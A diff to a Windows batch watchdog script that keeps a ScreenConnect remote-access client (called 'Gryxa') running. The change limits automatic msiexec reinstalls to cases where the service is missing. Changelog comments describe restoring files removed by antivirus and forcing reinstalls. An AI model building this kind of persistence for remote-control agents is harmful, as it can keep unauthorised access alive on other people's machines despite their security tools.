@@ -1,8 +1,8 @@
 @echo off
 rem ═══════════════════════════════════════════════════════════════
-rem  OWN_MON  BUILD 20260804M54
+rem  OWN_MON  BUILD 20260804M55
+rem  M55: no auto HEAL msiexec unless 1060; HEALTHY needs relay (L48). Stops HEAL /x killing online Guests.
 rem  M54: 1060 always bypasses heal rate-limit; STOPPED+relay start-only (M53).
-rem  M53: STOPPED+relay ImagePath → sc start only (never heal/reinstall); longer start wait; heal only on 1060.
 rem  M52: auto-heal stuck Gryxa (1060+dir / RUNNING no gryxa.com ImagePath) via F8/G7; restore lib if AV ate it.
 rem  M51: force_gryxa.flag queues own_gryxa_force REINSTALL (panel wipe). Daily path stays freeze.
 rem  M50: hash-mismatch → BUILD fallback (unstick CDN-stale main).
@@ -53,7 +53,7 @@ set "MSICACHE_G=%WD%\pkg_gryxa.msi"
 if not exist "%WD%" md "%WD%" 2>nul
 if not exist "%LOG%" type nul>"%LOG%" 2>nul
 
-set "MONVER=M54"
+set "MONVER=M55"
 set "PF86=%ProgramFiles(x86)%"
 set "GRYXA_DEEP=%WD%\gryxa_deep.flag"
 rem load current Gryxa FP (may rotate when server/keys change)
@@ -554,21 +554,15 @@ if "!GRYXA_OK!"=="0" (
   )
 )
 
-rem heal ONLY when service missing (1060). Never reinstall over STOPPED+relay.
+rem heal ONLY on hard 1060 (service missing). Never msiexec while svc exists.
 set "NEED_HEAL=0"
 if "!GRYXA_OK!"=="0" (
   sc query "ScreenConnect Client (%GRYXA_FP%)" >nul 2>&1
   if errorlevel 1 (
     set "NEED_HEAL=1"
-    if exist "%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" (
-      echo gryxa_1060_with_dir_heal>>"%LOG%"
-    ) else if exist "%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)\ScreenConnect.ClientService.exe" (
-      echo gryxa_1060_with_dir_heal>>"%LOG%"
-    ) else (
-      echo gryxa_absent_queue_heal>>"%LOG%"
-    )
+    echo gryxa_1060_queue_heal>>"%LOG%"
   ) else (
-    echo gryxa_svc_exists_skip_heal>>"%LOG%"
+    echo gryxa_svc_exists_skip_heal_start_only>>"%LOG%"
   )
 )
 if "!NEED_HEAL!"=="1" call :QueueGryxaHeal HEAL
